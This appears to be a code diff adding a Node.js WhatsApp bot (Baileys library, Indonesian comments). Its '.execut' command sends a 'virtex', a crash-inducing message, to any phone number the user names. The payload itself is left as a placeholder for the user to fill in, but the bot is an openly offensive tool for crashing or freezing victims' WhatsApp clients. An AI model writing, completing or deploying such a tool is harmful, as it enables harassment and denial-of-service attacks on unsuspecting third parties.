@@ -1,0 +1,99 @@
+const {
+    default: makeWASocket,
+    DisconnectReason,
+    useMultiFileAuthState,
+    makeInMemoryStore,
+    fetchLatestBaileysVersion
+} = require('@whiskeysockets/baileys');
+const pino = require('pino');
+
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
+store.readFromFile('./baileys_store.json')
+setInterval(() => {
+    store.writeToFile('./baileys_store.json')
+}, 10_000)
+
+async function connectToWhatsApp() {
+    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys')
+    const { version, isLatest } = await fetchLatestBaileysVersion()
+    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
+
+    const sock = makeWASocket({
+        version,
+        printQRInTerminal: true,
+        auth: state,
+        logger: pino({ level: 'silent' }),
+        msgRetryCounterCache: undefined,
+        defaultQueryTimeoutMs: undefined,
+    })
+
+    store.bind(sock.ev)
+
+    sock.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect } = update
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+            console.log('connection closed due to ', lastDisconnect?.error, ', reconnecting ', shouldReconnect)
+            // reconnect if not logged out
+            if (shouldReconnect) {
+                connectToWhatsApp()
+            }
+        }
+
+        if (connection === 'open') {
+            console.log('opened connection')
+        }
+
+    })
+
+    sock.ev.on('messages.upsert', async (m) => {
+        console.log(JSON.stringify(m, undefined, 2))
+
+        const msg = m.messages[0]
+        if (!msg.message) return
+        if (msg.key && msg.key.remoteJid === 'status@broadcast') return
+        const number = msg.key.remoteJid
+        const messageType = Object.keys(msg.message)[0]
+        const isGroup = number.endsWith('@g.us')
+        const text = messageType === 'conversation' ? msg.message.conversation : messageType == 'imageMessage' ? msg.message.imageMessage.caption : messageType == 'videoMessage' ? msg.message.videoMessage.caption : messageType == 'extendedTextMessage' ? msg.message.extendedTextMessage.text : messageType == 'buttonsResponseMessage' ? msg.message.buttonsResponseMessage.selectedButtonId : messageType == 'listResponseMessage' ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : messageType == 'templateButtonReplyMessage' ? msg.message.templateButtonReplyMessage.selectedId : ''
+        const command = text.startsWith('.') ? text.slice(1).trim().split(/ +/).shift().toLowerCase() : ''
+        const args = text.trim().split(/ +/).slice(1)
+        const q = args.join(' ')
+        const botNumber = sock.user.id.split(":")[0] + "@s.whatsapp.net"
+
+        if (command === 'menu') {
+            let menuText = `
+Halo! Ini adalah menu bot:\n
+.menu - Menampilkan menu ini\n
+.execut +62xxxx \n
+`;
+            sock.sendMessage(number, { text: menuText }, { quoted: msg });
+        }
+
+        if (command === 'execut') {
+            const targetNumber = args[0];
+            if (!targetNumber) {
+                sock.sendMessage(number, { text: "Tolong sertakan nomor target setelah .execut." }, { quoted: msg });
+                return;
+            }
+
+            // Membuat "virtex" (bug WhatsApp)
+            const virtex = "ISI_DENGAN_VIRTEX_1TB_KAMU"; // Ganti dengan virtex yang kamu inginkan
+
+            // Mengirim "virtex" ke nomor target
+            try {
+                await sock.sendMessage(targetNumber + "@s.whatsapp.net", { text: virtex });
+                sock.sendMessage(number, { text: `Virtex berhasil dikirim ke ${targetNumber}` }, { quoted: msg });
+            } catch (error) {
+                console.error("Gagal mengirim virtex:", error);
+                sock.sendMessage(number, { text: "Gagal mengirim virtex. Pastikan nomor target valid." }, { quoted: msg });
+            }
+        }
+
+    })
+
+    // save credentials whenever updated
+    sock.ev.on('creds.update', saveCreds)
+}
+
+connectToWhatsApp()
